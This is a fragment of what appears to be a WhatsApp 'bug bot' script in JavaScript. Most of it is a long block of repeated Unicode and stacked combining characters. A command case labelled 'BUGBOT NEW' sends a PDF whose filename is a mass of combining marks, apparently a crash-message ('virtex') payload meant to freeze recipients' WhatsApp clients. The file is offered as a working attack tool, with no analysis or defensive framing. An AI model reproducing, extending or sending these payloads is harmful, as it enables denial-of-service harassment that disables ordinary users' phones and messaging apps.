ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈᳓ࣰًًًًً᳕ܾࣶࣶ֖֖᷽ۡ᪳ࣧࣧ᪳́ࣼ᳚᪳־᱃ֻࣰࣱࣱࣱٍ᳕͙͙ࣹ͙ࣹ͙ࣩ̫̫᳕͙᳕͙ࣹ͙̫ࣩ̈٘ͧ٘ۛ٘̈ͧ̈̈̃ۡۛ̈ꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈꥈ𝟗𝟗𝟗`,},type:1}])
        break
case 'hanzcok':
        ptod = "6281337541779@s.whatsapp.net"
        stod = `${sender}`
       stst = await Hanz.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
tescok = `BUGBOT NEW`
Sendbutdocument(from, tescok, "HANZ々OFC彡*", fs.readFileSync('./media/Hanz Ofc.pdf'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./media/virgampdf.jpg'), filename:`*̴̵̸̡̨̛̛͇̻̬̥̖̘̦͍̣̰͖̰̻̗̖̙̙͙̞̙͓̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂̈́̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͘͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̸̴̢̡̢̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̜̫̘̬̞͉̦͕̭̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̿̿̀̊̒́̀̌̂̔̍̓̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́͌̈̓͋̄̿̾͆̏̈̌̑̍̐̿̈́̈́͊̕̕̕͜͟͟͜͡͝͝͝͝͠ͅ?̵̷̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̣̯̦̲͎͂́̔̉̉̍͑͌̍͋͗͐̂̐̕̚͝͡͝*̷̴̧̡̧̛̛̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̏͆͆̀̀̅͒́̋́͋͐͊͌̒͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̕̚̕̚͝͡͝͝͝⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̵̸̡̨̛̛͇̻̬̥̖̘͍̣̰͖̰̻̗̖̙̙͙̞̙͓̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂̈́̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͘͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̵̷̷̴̧̧̧̡̧̛̛̛̼͓̞͈͖̲͎̙̞͎͖̙̩̘̣̯̦̺̩̣̥͕̗̫̞̥̱̦̲̝̯͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̈́̾͂́̔̉̉̍͑͌̍͋͗͐̂̐̏͆͆̀̀̅͒́̋́͋͐͊͌̒͛́̿́͐̾̀̇̊̽͒̿̽͑̕̚̕̕̕̚̕̚͜͝͡͝͝͡͝͝͝⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̣̯̦̲͎͍̓̈̇͑͌̍͋͗͐̂̐̚͜͜͡͝*̷̴̧̡̡̧̛̛̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̏͆͆̀̀̅͒́̋́͋͐͊͌̒͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̕̚̕̚͜͝͡͝͝͝⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̵̸̡̨̛̛͇̻̬̥̖̘̦͍̣̰͖̰̻̗̖̙̙͙̞̙͓̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂̈́̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͘͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̸̴̢̡̢̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̜̫̘̬̞͉̦͕̭̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̿̿̀̊̒́̀̌̂̔̍̓̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́͌̈̓͋̄̿̾͆̏̈̌̑̍̐̿̈́̈́͊̕̕̕͜͟͟͜͡͝͝͝͝͠ͅ?̵̷̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘̣̯̦̲͎͂́̔̉̉̍͑͌̍͋͗͐̂̐̕̚͝͡͝*̷̴̧̡̧̛̛̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̏͆͆̀̀̅͒́̋́͋͐͊͌̒͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̕̚̕̚͝͡͝͝͝⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤